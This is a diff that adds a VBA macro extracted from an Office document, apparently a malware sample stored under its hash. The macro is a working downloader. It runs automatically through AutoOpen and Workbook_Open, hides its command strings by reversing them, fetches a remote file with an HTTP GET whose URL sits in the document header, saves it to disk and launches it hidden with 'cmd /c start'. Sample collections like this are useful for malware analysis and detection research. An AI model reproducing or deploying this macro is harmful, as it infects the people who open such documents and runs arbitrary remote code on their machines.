@@ -1,0 +1,57 @@
+Filename     : ./macros/d72e40c75759084fa32bf5be69b8651a8359b4ba1ee261aa36cb7166e3bff045
+OLE stream   : VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub iAqxjnMWo(ByVal m8VwqlZ, ByVal UFMDy2MQ0Fx9)
+    On Error Resume Next
+    wN_yM7faG = UFMDy2MQ0Fx9.responseBody
+    m8VwqlZ.Write wN_yM7faG
+End Sub
+
+Sub AutoOpen()
+    On Error Resume Next
+    Const CCTR = "/ dm"
+    Const KMKM = "km "
+    Const CCCC = " c"
+
+    TMmvW1PWSC1T = Split(ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.Text, "|")
+
+    Dim xZ60Jz5iV
+    Set xZ60Jz5iV = CreateObject(TMmvW1PWSC1T(0) & "." & TMmvW1PWSC1T(1))
+    knC9jvuwqLbE = xZ60Jz5iV.ExpandEnvironmentStrings(TMmvW1PWSC1T(5))
+
+    EiAnb578OXPL = Split(knC9jvuwqLbE, "\")
+    BqG4riN = UBound(EiAnb578OXPL)
+    
+    xZ60Jz5iV.Run "c" & StrReverse(KMKM & CCCC & CCTR) & "dir """ & Mid(knC9jvuwqLbE, 1, Len(knC9jvuwqLbE) - Len(EiAnb578OXPL(BqG4riN))) & """", 0, True
+
+    Set KrAEecF56W4Q = CreateObject(TMmvW1PWSC1T(2))
+    KrAEecF56W4Q.Open Chr$(71) + Chr$(69) + Chr$(84), TMmvW1PWSC1T(4), False
+    KrAEecF56W4Q.setRequestHeader "Cache-Control", "no-cache, no-store"
+
+    Set dHrB1C9 = CreateObject(TMmvW1PWSC1T(3))
+    dHrB1C9.Open
+    KrAEecF56W4Q.send
+    dHrB1C9.Type = 1
+    Application.Run "iAqxjnMWo", dHrB1C9, KrAEecF56W4Q
+    Application.Run "GxRD57aAL_9", dHrB1C9, knC9jvuwqLbE
+    dHrB1C9.Close
+    xZ60Jz5iV.Run "c" & StrReverse(""" """" trats" & " c" & CCTR) & knC9jvuwqLbE & """", 0, False
+End Sub
+
+Function GxRD57aAL_9(ByVal dHrB1C9TMP, ByVal knC9jvuwqLbETMP)
+    dHrB1C9TMP.SaveToFile knC9jvuwqLbETMP, 2
+End Function
+
+Sub Workbook_Open()
+    On Error Resume Next
+    AutoOpen
+End Sub
